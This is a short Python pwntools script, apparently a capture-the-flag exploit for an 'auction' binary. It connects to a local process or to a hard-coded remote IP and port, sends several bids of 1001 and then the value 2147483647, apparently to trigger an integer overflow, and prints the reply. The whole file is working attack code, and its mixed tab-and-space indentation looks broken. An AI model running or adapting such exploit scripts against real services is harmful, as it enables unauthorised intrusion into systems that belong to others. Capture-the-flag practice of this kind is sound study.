#!/usr/bin/python
from pwn import *
import sys

host = '128.199.161.191'
port = 23337

def exploit (r):
	payload = str (1001)
	silver_bullet = str (2147483647)
    	for x in range (4):
		print r.recvuntil (": ")
		r.sendline (payload)
    	print r.recvuntil (": ")
	r.sendline (silver_bullet)
	print r.recvall ()

e = ELF ('./auction')

if len (sys.argv) == 2:
	if (sys.argv [1] == 'debug'):
		r = process ('./auction')
		gdb.attach (r)
		exploit (r)
	else:
		r = remote (host, port)
		exploit (r)
else:
	r = process ('./auction')
	exploit (r)
